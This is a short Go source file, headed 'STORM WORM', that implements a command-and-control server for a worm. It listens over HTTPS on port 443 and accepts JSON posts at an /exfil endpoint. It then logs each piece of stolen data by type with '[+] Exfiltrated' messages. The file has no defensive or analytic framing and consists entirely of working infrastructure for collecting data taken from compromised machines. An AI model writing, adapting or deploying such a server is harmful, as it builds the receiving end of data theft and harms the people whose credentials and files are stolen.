// STORM WORM: C2 Server for Exfiltrated Data

package main

import (
	"encoding/json"
	"log"
	"net/http"
)

type ExfilData struct {
	Type      string `json:"type"`
	Data      string `json:"data"`
	Timestamp string `json:"timestamp"`
}

func exfilHandler(w http.ResponseWriter, r *http.Request) {
	var data ExfilData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid data", http.StatusBadRequest)
		return
	}

	log.Printf("[+] Exfiltrated %s: %s", data.Type, data.Data)
	w.WriteHeader(http.StatusOK)
}

func main() {
	http.HandleFunc("/exfil", exfilHandler)
	log.Println("[+] C2 Server listening on :443")
	log.Fatal(http.ListenAndServeTLS(":443", "server.crt", "server.key", nil))
}
